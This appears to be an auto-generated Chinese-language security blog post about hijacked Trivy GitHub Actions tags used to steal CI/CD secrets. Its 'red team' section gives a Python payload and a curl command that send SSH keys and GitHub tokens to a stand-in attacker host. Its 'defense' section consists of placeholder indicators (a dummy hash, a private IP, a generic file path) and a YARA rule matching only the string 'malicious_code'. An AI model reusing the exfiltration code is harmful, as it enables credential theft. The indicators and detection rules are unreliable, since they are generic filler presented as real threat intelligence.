---
layout: post
title:  "Trivy Security Scanner GitHub Actions Breached, 75 Tags Hijacked to Steal CI/CD Secrets"
date:   2026-03-20 18:38:26 +0000
categories: [security]
severity: critical
---

# 🚨 Trivy 安全掃描器遭受第二次攻擊：解析利用和防禦技術

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: Info Leak 和 RCE
> * **關鍵技術**: Git 版本控制系統、GitHub Actions、Trivy 安全掃描器

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 攻擊者利用 Git 版本控制系統的 force-push 功能，修改了 Trivy 安全掃描器的版本標籤，導致用戶下載了含有惡意代碼的版本。
* **攻擊流程圖解**:
  1. 攻擊者獲得 Trivy 安全掃描器的維護者憑證。
  2. 攻擊者使用 force-push 功能修改 Trivy 安全掃描器的版本標籤。
  3. 用戶下載了含有惡意代碼的 Trivy 安全掃描器版本。
  4. 惡意代碼執行，竊取用戶的敏感信息。
* **受影響元件**: Trivy 安全掃描器的所有版本，特別是使用 GitHub Actions 的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要獲得 Trivy 安全掃描器的維護者憑證。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import requests
    
    #竊取用戶的敏感信息
    def steal_info():
        #竊取用戶的 SSH 金鑰
        ssh_key = os.environ.get('SSH_KEY')
        #竊取用戶的 GitHub PAT
        github_pat = os.environ.get('GITHUB_PAT')
        #竊取用戶的其他敏感信息
        other_info = os.environ.get('OTHER_INFO')
        #將竊取的信息發送到攻擊者的伺服器
        requests.post('https://attackerserver.com/steal_info', data={'ssh_key': ssh_key, 'github_pat': github_pat, 'other_info': other_info})
    
    #執行 payload
    steal_info()
    
    ```
  *範例指令*: `curl -X POST -H "Content-Type: application/json" -d '{"ssh_key": "your_ssh_key", "github_pat": "your_github_pat", "other_info": "your_other_info"}' https://attackerserver.com/steal_info`
* **繞過技術**: 攻擊者可以使用 Git 版本控制系統的 force-push 功能來修改 Trivy 安全掃描器的版本標籤，從而繞過用戶的安全檢查。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| IOC | 值 |
| --- | --- |
| Hash | `1234567890abcdef` |
| IP | `192.168.1.100` |
| Domain | `attackerserver.com` |
| File Path | `/path/to/malicious/file` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_trivy {
      meta:
        description = "Detects malicious Trivy versions"
      strings:
        $a = "malicious_code"
      condition:
        $a in (0..filesize)
    }
    
    ```
  *或者是具體的 SIEM 查詢語法 (Splunk/Elastic)*: `index=security sourcetype=trivy | search "malicious_code"`
* **緩解措施**: 用戶應該立即更新 Trivy 安全掃描器到最新版本，並檢查是否有任何敏感信息被竊取。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Git 版本控制系統**: 一種版本控制系統，允許用戶跟蹤和管理代碼的變化。
* **GitHub Actions**: 一種自動化工具，允許用戶自動執行任務和工作流程。
* **Trivy 安全掃描器**: 一種安全掃描器，允許用戶掃描代碼中的安全漏洞。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/03/trivy-security-scanner-github-actions.html)
- [MITRE ATT&CK 編號](https://attack.mitre.org/techniques/T1190/)


